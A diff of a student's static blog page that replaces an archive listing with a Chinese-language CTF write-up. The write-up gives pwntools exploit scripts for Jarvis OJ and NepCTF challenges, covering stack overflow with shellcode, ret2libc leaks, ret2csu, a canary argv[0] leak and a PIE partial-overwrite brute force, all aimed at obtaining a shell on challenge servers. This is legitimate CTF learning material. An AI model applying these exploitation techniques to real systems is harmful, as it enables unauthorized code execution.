@@ -6,17 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://qingmu-z.github.io">
-  <title>Archives: 2020/12 | 清霂qingmu-z</title>
+  <title>Jarvis OJ pwn | 清霂qingmu-z</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="河南大学大一新生">
-<meta property="og:type" content="website">
-<meta property="og:title" content="清霂qingmu-z">
-<meta property="og:url" content="https://qingmu-z.github.io/archives/2020/12/index.html">
+  <meta name="description" content="1.level12.level33.level3_x644.smashes5.easystack（nepctf）6.[签到] 送你一朵小红花 (nepctf)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jarvis OJ pwn">
+<meta property="og:url" content="https://qingmu-z.github.io/2021/03/26/jarvisoj/pwn/index.html">
 <meta property="og:site_name" content="清霂qingmu-z">
-<meta property="og:description" content="河南大学大一新生">
+<meta property="og:description" content="1.level12.level33.level3_x644.smashes5.easystack（nepctf）6.[签到] 送你一朵小红花 (nepctf)">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-03-26T09:28:10.359Z">
+<meta property="article:modified_time" content="2021-03-26T09:40:49.332Z">
 <meta property="article:author" content="朱登榜">
-<meta property="article:tag" content="c++,二进制，leetcode,信息安全">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="Jarvis OJ">
+<meta property="article:tag" content="nepctf">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="清霂qingmu-z" type="application/atom+xml">
@@ -224,285 +229,284 @@ color="0,0,255" opacity='0.9' zIndex="-1" count="300" src="//cdn.bootcss.com/can
           </div>
           <div id="js-content" class="content-ll">
             
-  
-  
+<article id="post-jarvisoj/pwn" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Jarvis OJ pwn
+    </h1>
+  
+
+<!--显示阅读次数-->
+
+  <br/>
+  <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+  <span class="icon-sort"></span>
+  <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+    阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+  </span>
+  </a>
+
+<!--显示阅读次数完毕-->
+        
+        <a href="/2021/03/26/jarvisoj/pwn/" class="archive-article-date">
+  	<time datetime="2021-03-26T09:28:10.359Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-26</time>
+</a>
+        <!-- 需要添加的位置 -->
+        <!-- 开始添加字数统计-->
+        
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  字数统计: </span>
+        <span class="post-count" style="color:#ef7522;font-size:14px;">829字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  阅读时长: </span>
+        <span class="post-count" style="color:#ef7522;font-size:14px;">4分</span>
+      </span>
+    </span>
+</div>
+          
+        <!-- 添加完成 -->
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>1.level1<br>2.level3<br>3.level3_x64<br>4.smashes<br>5.easystack（nepctf）<br>6.[签到] 送你一朵小红花 (nepctf)</p>
+<a id="more"></a>
+<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p>
+<h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./level1.80eacdcd51aca92af7749d96efad7fb5&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;pwn2.jarvisoj.com&quot;</span>,<span class="number">9877</span>)</span><br><span class="line"></span><br><span class="line">    sh=io.recvuntil(<span class="string">&quot;\n&quot;</span>)[<span class="number">14</span>:-<span class="number">2</span>]</span><br><span class="line">    print(sh)</span><br><span class="line">    shell_addr=<span class="built_in">int</span>(sh.decode(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    payload =asm(shellcraft.sh())</span><br><span class="line">    payload+=(<span class="number">0x88</span>+<span class="number">4</span>-<span class="built_in">len</span>(payload))*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">    payload+=p32(shell_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>重新做这个题弄懂了接收地址时以及p32,p64,p16的一些细节</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf</span></span><br><span class="line">elf=ELF(<span class="string">&quot;level3&quot;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048484</span></span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.19.so&quot;</span>)</span><br><span class="line">write_libc=libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_libc=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_libc=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;pwn2.jarvisoj.com&quot;</span>,<span class="number">9879</span>)</span><br><span class="line"></span><br><span class="line">    payload =<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)</span><br><span class="line">    payload+=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">8</span>)</span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line">    <span class="comment">#addr=io.recvline()[:-7]</span></span><br><span class="line">    addr=io.recv(<span class="number">8</span>)</span><br><span class="line">    <span class="comment">#addr=io.recv(4)</span></span><br><span class="line">    print(addr)</span><br><span class="line">    <span class="comment">#addr=addr.ljust(8,b&#x27;\x00&#x27;)</span></span><br><span class="line">    print(addr)</span><br><span class="line">    <span class="comment">#write_addr=u32(addr)</span></span><br><span class="line">    write_addr=u64(addr)</span><br><span class="line">    print(write_addr)</span><br><span class="line">    <span class="comment">#count</span></span><br><span class="line">    libcbase=write_addr-write_libc</span><br><span class="line">    sys_addr=libcbase+sys_libc</span><br><span class="line">    binsh_addr=libcbase+binsh_libc</span><br><span class="line">    <span class="comment">#getshell</span></span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(sys_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(binsh_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="level3-x64"><a href="#level3-x64" class="headerlink" title="level3_x64"></a>level3_x64</h1><p>x64位程序调用函数一般应该使用万能gadget（ret2csu）控制参数<br>这个题ROPgadget中只能控制rdi和rsi，无法控制rdx，但由于调用read函数时rdx被置于0x200h，并且没有改变，rdx大于8，因此能够leak出我们所需地址，因此可以不用csu解题</p>
+<p>这里练习一下ret2csu，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi rsi rdx(0x200h) libc</span></span><br><span class="line"><span class="comment">#wn_gadget</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf</span></span><br><span class="line">elf=ELF(<span class="string">&quot;level3_x64&quot;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x40061A</span></span><br><span class="line">pop6_addr=<span class="number">0x4006AA</span></span><br><span class="line">mov3_addr=<span class="number">0x400690</span></span><br><span class="line">pop_rdi=<span class="number">0x4006b3</span></span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.19.so&quot;</span>)</span><br><span class="line">write_libc=libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_libc=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_libc=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">r12,r13,r14,r15,ret</span>):</span></span><br><span class="line">    payload =<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br><span class="line">    payload+=p64(pop6_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    payload+=p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload+=p64(mov3_addr)</span><br><span class="line">    payload+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">56</span>)</span><br><span class="line">    payload+=p64(ret)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;pwn2.jarvisoj.com&quot;</span>,<span class="number">9883</span>)</span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">    csu(write_got,<span class="number">8</span>,write_got,<span class="number">1</span>,main_addr)</span><br><span class="line">    addr=io.recv(<span class="number">8</span>)</span><br><span class="line">    print(addr)</span><br><span class="line">    write_addr=u64(addr)</span><br><span class="line">    print(write_addr)</span><br><span class="line">    <span class="comment">#count</span></span><br><span class="line">    libcbase=write_addr-write_libc</span><br><span class="line">    sys_addr=libcbase+sys_libc</span><br><span class="line">    binsh_addr=libcbase+binsh_libc</span><br><span class="line">    <span class="comment">#getshell</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<h1 id="smashes"><a href="#smashes" class="headerlink" title="smashes"></a>smashes</h1><p>canary:ssp攻击（故意触发，覆盖argv[0]，输出已知地址字符串）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./smashes.44838f6edd4408a53feb2e2bbfe5b229&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;pwn.jarvisoj.com&quot;</span>,<span class="number">9877</span>)</span><br><span class="line">    payload =p64(<span class="number">0x0400d20</span>)*<span class="number">0x200</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Hello!\nWhat&#x27;s your name? &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="easystack（nepctf）"><a href="#easystack（nepctf）" class="headerlink" title="easystack（nepctf）"></a>easystack（nepctf）</h1><p>和smashes一个知识点</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./easystack&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node2.hackingfor.fun&quot;</span>,<span class="number">35241</span>)</span><br><span class="line">    payload = p64(<span class="number">0x6cde20</span>)*<span class="number">100</span> </span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="签到-送你一朵小红花-nepctf"><a href="#签到-送你一朵小红花-nepctf" class="headerlink" title="[签到] 送你一朵小红花 (nepctf)"></a>[签到] 送你一朵小红花 (nepctf)</h1><p>知识点：<br>1.malloc开了0x18空间，而栈只有0x10空间<br>2.地址随机化，低位覆盖</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">32045</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>)+p8(<span class="number">0xe1</span>)) <span class="comment"># p16(0x4e1),由于pie地址随机化，只需覆盖地位地址</span></span><br><span class="line">    res = p.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Nep&#123;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> (res)</span><br></pre></td></tr></table></figure>
+
+      
+
+
+       
+         <div class="essayending">
+           <div>
+            <div style="text-align:center;color: #ccc;font-size:22px;">
+            <br/>
+            <br/>
+ -------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------
+            <br/>
+            <br/>
+             <br/>
+             <br/>
+            </div>
+           </div>
+         </div>
+         
+
+  
+
+
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/12/15/%E4%BF%A1%E6%81%AF%E5%AD%A6%E5%A5%A5%E8%B5%9B%E4%B8%80%E6%9C%AC%E9%80%9A/%E9%80%92%E6%8E%A8%E7%AE%97%E6%B3%95/" class="archive-article-date">
-  	<time datetime="2020-12-14T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/12/15/%E4%BF%A1%E6%81%AF%E5%AD%A6%E5%A5%A5%E8%B5%9B%E4%B8%80%E6%9C%AC%E9%80%9A/%E9%80%92%E6%8E%A8%E7%AE%97%E6%B3%95/">信息学奥赛一本通 递推算法</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">算法</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">信息学奥赛一本通</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/12/11/%E4%BF%A1%E6%81%AF%E5%AD%A6%E5%A5%A5%E8%B5%9B%E4%B8%80%E6%9C%AC%E9%80%9A/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/" class="archive-article-date">
-  	<time datetime="2020-12-10T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/12/11/%E4%BF%A1%E6%81%AF%E5%AD%A6%E5%A5%A5%E8%B5%9B%E4%B8%80%E6%9C%AC%E9%80%9A/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/">信息学奥赛一本通 排序算法</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">算法</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">信息学奥赛一本通</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/12/06/%E7%89%9B%E5%AE%A2%E7%BD%91/2019%E5%B9%B4%E5%B9%BF%E4%B8%9C%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E8%85%BE%E8%AE%AF%E6%9D%AF%E6%96%B0%E7%94%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%90%8C%E6%AD%A5%E8%B5%9B%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2020-12-05T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/12/06/%E7%89%9B%E5%AE%A2%E7%BD%91/2019%E5%B9%B4%E5%B9%BF%E4%B8%9C%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E8%85%BE%E8%AE%AF%E6%9D%AF%E6%96%B0%E7%94%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%90%8C%E6%AD%A5%E8%B5%9B%EF%BC%89/">2019年广东工业大学腾讯杯新生程序设计竞赛（同步赛）</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">牛客网</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/12/06/%E7%89%9B%E5%AE%A2%E7%BD%91/2020%E5%B9%B4%E5%B9%BF%E4%B8%9C%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%96%87%E8%BF%9C%E7%9F%A5%E8%A1%8C%E6%9D%AF%E6%96%B0%E7%94%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%90%8C%E6%AD%A5%E8%B5%9B%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2020-12-05T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/12/06/%E7%89%9B%E5%AE%A2%E7%BD%91/2020%E5%B9%B4%E5%B9%BF%E4%B8%9C%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%96%87%E8%BF%9C%E7%9F%A5%E8%A1%8C%E6%9D%AF%E6%96%B0%E7%94%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%90%8C%E6%AD%A5%E8%B5%9B%EF%BC%89/">2020年广东工业大学第十届文远知行杯新生程序设计竞赛（同步赛）</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">牛客网</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/12/05/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2020-12-04T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
